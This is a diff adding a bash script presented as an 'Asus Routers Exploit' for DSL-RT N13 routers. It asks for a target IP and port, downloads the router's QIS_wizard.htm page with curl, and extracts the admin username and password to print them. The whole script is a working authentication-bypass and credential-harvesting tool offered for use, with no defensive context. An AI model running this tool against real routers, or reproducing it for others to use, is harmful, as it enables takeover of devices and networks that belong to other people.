@@ -1,0 +1,98 @@
+#!/bin/bash
+# Asus Routers Exploit (ARE)
+# Coded by : ksrvco
+# Category : Local and Remote
+# Reuirements : Opening ports 80,8080,443
+# Models that affect‌ : DSL-RT N13
+# Tested on Linux operation systems
+reset
+dir = "/opt/"
+rm -rf /opt/a.htm
+clear
+echo ""
+echo ""
+for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+echo ""
+echo " [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]"
+echo ""
+echo -e "\e[93m [+] Tool name: Asus Router Exploit\e[0m"
+echo -e "\e[93m [+] Models that affect‌ : DSL-RT N13 \e[0m"
+echo -e "\e[93m [+] Coded by: ksrvco\e[0m"
+echo -e "\e[93m [+] Contact me: flower.k2000@gmail.com\e[0m"
+echo ""
+echo " [+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+][+]"
+echo ""
+for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+echo ""
+echo ""
+echo -e "\e[93m Options Of Tool: "
+echo ""
+echo "     1. Start"
+echo "     2. About"
+echo "     3. Exit"
+echo ""
+read -p " Please choose an option: " option
+echo ""
+echo ""
+	if [ $option == "2" ]
+		then
+			clear
+			echo ""
+      for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+      echo ""
+      echo " [+] About this tool :"
+      echo ""
+      echo -e " Hi dear friend ... This tool is an asus router exploiter.
+      This tool working with an vulnerability on Asus Routers and we can using
+      this tool for bypass authentication and exploit the router config panel.
+      Also this tool working on DSL-RT N13 models of asus company.
+      Thanks for using this tool and my exploit."
+      echo ""
+      for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+      echo ""
+      echo ""
+    elif [ $option == "3" ]
+      then
+        clear
+        exit
+    elif [ $option == "1" ]
+    	then
+    		clear
+    		echo ""
+        for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+        echo ""
+        echo " [+] Starting Steps "
+        echo ""
+        echo ""
+        read -p " [++] Please enter target ip (ex: 5.2.5.5) : " ip
+        echo ""
+        read -p " [++] Please enter port number (ex: 8080) : " port
+        echo ""
+        read -p " [++] Please enter protocol (http or https) : " protocol
+        echo ""
+        echo " [**] Ok, Please wait ... "
+        echo ""
+        curl --silent $protocol://$ip:$port/QIS_wizard.htm > $dir/a.htm
+        echo ""
+        echo " [**] Searching data ..."
+        echo ""
+        cat $dir/a.htm | grep "http_username" | cut -d " " -f4 | cut -d '"' -f2 > $dir/user
+        cat $dir/a.htm | grep "http_passwd" | cut -d " " -f4 | cut -d '"' -f2 > $dir/pass
+        username=$(<$dir/user)
+        password=$(<$dir/pass)
+        echo ""
+        for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+        echo ""
+        echo " [>>] Address : $protocol://$ip:$port"
+        echo " [>>] Username : $username"
+        echo " [>>] Password : $password"
+        echo ""
+        for i in {16..21} {21..16} ; do echo -en "\e[48;5;${i}m \e[0m" ; done ; echo
+        echo ""
+    else
+      clear
+      echo ""
+      echo " [+] Wrong selection. exiting ..."
+      sleep 2
+      exit
+   fi
